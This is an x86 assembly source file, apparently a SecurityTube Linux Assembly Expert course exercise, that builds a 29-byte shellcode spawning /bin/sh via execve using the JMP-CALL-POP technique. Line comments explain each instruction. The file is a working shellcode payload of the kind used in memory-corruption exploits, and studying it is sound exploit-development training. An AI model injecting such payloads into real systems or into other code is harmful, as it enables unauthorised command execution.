; Filename: shell_jmp-call-pop.nasm
; Author:  Marco Lugo (SLAE-1031)
; Description: spawns a shell
;
; For the SecurityTube Linux Assembly Expert (SLAE) course
; Using the JMP-CALL-POP method
; The resulting shellcode is 29 bytes

global _start

section .text
_start:
	xor eax, eax ; assigns 0x00 to EAX
	push eax ; push 0x00 (null byte) to stack
	jmp step1 ; unconditional jump to step1

step2:
	; as we enter here, null-terminated shellpath string is in stack
	pop ebx ; retrieves it and passes it to EBX, which will act as an argument to execve

	push ebx ; puts the null-terminated shellpath in the stack 
	lea ecx, [esp] ; retrieves the address of the null-terminated shellpath and assigns it to ECX, an argument for execve
	; the two previous lines could be replaced by lea ecx, [esp-4] but it yields no size optimization for the shellcode size

	xor edx, edx ; ; assigns 0x00 to EDX which will also act as an argument for execve

	mov al, 0x0b ; assign 11 to al (eax) as this is the syscall number for execve
	int 0x80 ; syscall
	
step1:
	call step2 ; this will put the shellpath address in stack, the equivalent of doing a PUSH and jump to step2
	shellpath db "//bin/sh"
